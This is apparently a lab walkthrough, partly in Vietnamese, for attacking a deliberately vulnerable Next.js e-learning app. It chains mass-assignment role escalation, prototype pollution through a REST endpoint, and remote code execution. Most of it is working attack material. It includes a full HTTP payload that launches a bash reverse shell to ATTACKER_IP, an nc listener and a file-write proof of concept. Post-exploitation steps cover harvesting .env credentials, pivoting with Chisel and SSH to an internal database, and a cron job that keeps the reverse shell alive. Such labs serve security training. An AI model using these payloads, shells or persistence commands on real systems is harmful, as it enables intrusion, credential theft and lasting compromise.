
# Lab Walkthrough: React2Shell (CVE-2025-55182)

## 1. Objective
The goal of this lab is to exploit a multi-stage vulnerability chain in a modern Next.js 16 application to achieve Remote Code Execution (RCE) on the server running Node.js 24.15.0.

**Attack Chain:** Register STUDENT → Mass Assignment (LECTURER) → Prototype Pollution → RCE → Reverse Shell

## 2. Reconnaissance
- **Target URL:** `http://TARGET_IP:3000`
- **Goal:** Identify the technology stack and potential entry points.
- **Tools:** Nmap, Wappalyzer, Browser DevTools, Burp Suite.
- **Findings:**
  - Next.js 16 / React 19 (check `x-powered-by` header or page source)
  - Server Actions endpoints (POST requests to the same URL with `Next-Action` header)
  - REST API endpoints at `/api/assignments` (discoverable via JS bundle analysis)
  - Login page at `/login`, Registration at `/register`

## 3. Stage 1: Initial Access & Privilege Escalation

### 3.1 Register as STUDENT
1. Navigate to `/register`.
2. Create a new account (any email/password). 
3. The server **enforces** `role: "STUDENT"` regardless of what the UI sends.

### 3.2 Exploit Mass Assignment (STUDENT → LECTURER)
1. Login and navigate to `/student/settings`.
2. Open Burp Suite and intercept the "Save Changes" request.
3. The request calls the Server Action `updateUserProfile(userId, updateData)`.
4. **Inject** `"role": "LECTURER"` into the `updateData` object:

**Why this works:** 
- `updateUserProfile` uses `deepMerge()` to merge client data into the user object.
- The code blocks escalation to `ADMIN` but **allows** `LECTURER`.
- See: `lib/actions/user.ts` lines 37-49.

### 3.3 Refresh Session
1. **Logout** and **login again** with the same credentials.
2. The JWT now contains `role: "LECTURER"`.
3. You will be redirected to `/lecturer/dashboard` instead of `/student/dashboard`.

## 4. Stage 2: Discovery & Enumeration

1. **Access Lecturer Features:** Navigate to `/lecturer/assignments`.
2. **Analyze JS Bundle:** Using Browser DevTools or Burp, search the JavaScript source for API endpoints. You will find `/api/assignments` — a REST API endpoint for creating assignments.
3. **Key observation:** The Server Action version uses React 19's `decodeReply()` which strips `__proto__` keys. But the REST API endpoint uses standard `JSON.parse` — no protection.

> **Critical Insight:** React 19 added `__proto__` sanitization in `decodeReply()`, making Prototype Pollution via Server Actions impossible. The attacker must discover an alternative endpoint (REST API) that bypasses this protection.

## 5. Stage 3: Prototype Pollution → RCE (Chi tiết trên Burp Suite)

### 5.0 Background

The REST API endpoint at `/api/assignments` is vulnerable to **Prototype Pollution → RCE** (React2Shell / CVE-2025-55182). The attack chain:

1. `JSON.parse` preserves `__proto__` as an own property (unlike React 19's `decodeReply` which strips it)
2. `deepMerge()` from `lib/utils/unsafeMerge.ts` does NOT sanitize `__proto__` keys — it recursively merges attacker data into the metadata object tree
3. `extractConfigValue()` walks the entire object tree (including `__proto__` subtrees) to find configuration values
4. The attacker's `logCommand` is found and passed directly to `child_process.exec()` → **RCE**

### 5.1 Bước 1: Chuẩn bị C2 Listener

Trên máy attacker, mở terminal:

```bash
nc -lvnp 4444
```

### 5.2 Bước 2: Lấy Cookie LECTURER

1. Đảm bảo bạn đã escalate lên LECTURER (Stage 1) và đã re-login.
2. Mở Burp Suite, Tab Proxy, HTTP history.
3. Tìm bất kỳ request nào đến TARGET_IP:3000 rồi Copy giá trị cookie `authjs.session-token`.

### 5.3 Bước 3: Craft payload trong Burp Repeater

Mở tab Repeater trong Burp Suite. Tạo request mới:

```http
POST /api/assignments HTTP/1.1
Host: TARGET_IP:3000
Content-Type: application/json
Cookie: authjs.session-token=PASTE_LECTURER_COOKIE_HERE

{"title":"Final Exam","dueDate":"2026-06-30","dueTime":"23:59","module":"Advanced Math","type":"Project","submissionsDone":0,"submissionsTotal":128,"status":"Published","__proto__":{"logCommand":"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"}}
```

Thay `TARGET_IP` bằng IP web server (ví dụ: `192.168.95.128`). Thay `ATTACKER_IP` bằng IP máy C2 (ví dụ: `192.168.95.132`).

**Giải thích kỹ thuật:**

| Phần payload | Mục đích |
|---|---|
| `title`, `dueDate`, `module`... | Các trường hợp lệ để assignment được tạo |
| `"__proto__"` | Key đặc biệt trong JavaScript — trỏ đến prototype chain |
| `"logCommand"` | Property được `extractConfigValue()` tìm thấy và `exec()` thực thi |
| `bash -c 'bash -i >& ...'` | Reverse shell command |

### 5.4 Bước 4: Fire!

1. Nhấn Send trong Repeater.
2. Server xử lý:
   - `auth()` → kiểm tra session → role LECTURER → **PASS** ✓
   - `JSON.parse(body)` → giữ `__proto__` như own property → **PRESERVED** ✓
   - `deepMerge(baseMetadata, meta)` → `__proto__.logCommand` được merge vào object tree → **POLLUTED** ✓
   - `extractConfigValue(baseMetadata, "logCommand")` → tìm thấy command trong `__proto__` subtree → **FOUND** ✓
   - `exec(logCommand)` → **RCE** ✓
3. Server trả về `{"id":"...","success":true}`.
4. Kiểm tra terminal nc listener — reverse shell kết nối trong vài giây.

### 5.5 Bước 5: Xác nhận shell

```bash
$ id
uid=1000(tcus) gid=1000(tcus) groups=1000(tcus)
$ cat .env
DATABASE_URL="postgresql://postgres:postgres@localhost:5432/elearning"
AUTH_SECRET="k8sJ3mP9xR2vL5nQ7wF0yT4uA6bD1eH"
DB_INTERNAL_HOST=172.20.0.5
DB_USER=readonly_auditor
DB_PASS=Learning@2026!
```

### 5.6 Troubleshooting

| Vấn đề | Nguyên nhân | Giải pháp |
|---|---|---|
| Response `403 Forbidden` | Role chưa là LECTURER | Quay lại Stage 1.2 escalate role |
| Response `401 Unauthorized` | Session hết hạn | Re-login và copy cookie mới |
| Response `200` nhưng không có shell | Firewall chặn outbound | Thử `touch /tmp/pwned` trước |
| Response `404 Not Found` | Server chưa restart | Restart dev server |
| Response `500` | JSON body sai format | Body phải là `{...}` (object đơn) |

### 5.7 PoC Alternative: Xác nhận RCE không cần listener

```json
{"title":"RCE Test","dueDate":"2026-06-30","dueTime":"23:59","module":"Test","type":"Homework","submissionsDone":0,"submissionsTotal":128,"status":"Published","__proto__":{"logCommand":"touch /tmp/pwned && echo PROTOTYPE_POLLUTION_RCE > /tmp/pwned"}}
```

Sau đó kiểm tra: `cat /tmp/pwned` sẽ cho output `PROTOTYPE_POLLUTION_RCE`.

## 6. Stage 4: Post-Exploitation

### 6.1 Credential Harvesting
```bash
cat .env
```
You will find:
```
DB_INTERNAL_HOST=172.20.0.5
DB_USER=readonly_auditor
DB_PASS=Learning@2026!
```

### 6.2 Pivoting to Internal Database
The internal PostgreSQL server at `172.20.0.5` is not directly accessible from the attacker machine. Use the compromised web server as a pivot:

```bash
# Option 1: Chisel (upload to target first)
./chisel server -p 8888 --reverse    # On attacker
./chisel client ATTACKER_IP:8888 R:5433:172.20.0.5:5432  # On target

# Option 2: SSH Dynamic Port Forwarding
ssh -D 1080 -N user@TARGET_IP

# Then connect via pivoted port:
psql -h 127.0.0.1 -p 5433 -U readonly_auditor -d elearning
```

### 6.3 Persistence
```bash
# Add a cron job for auto-reconnecting reverse shell
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
```

## 7. Conclusion
This lab demonstrates that:
1. Updating runtime (Node.js 24) is **not** a substitute for secure coding practices.
2. React 19 / Next.js 16 added `__proto__` sanitization in Server Actions (`decodeReply`), but REST API endpoints using raw `JSON.parse` + `deepMerge` remain vulnerable to Prototype Pollution → RCE.
3. Multi-stage attack paths (Registration → Mass Assignment → Prototype Pollution → RCE → Pivoting) are common in real-world breaches.
4. The `deepMerge` anti-pattern without `__proto__` key filtering is a critical vulnerability class that persists across JavaScript/TypeScript ecosystems.
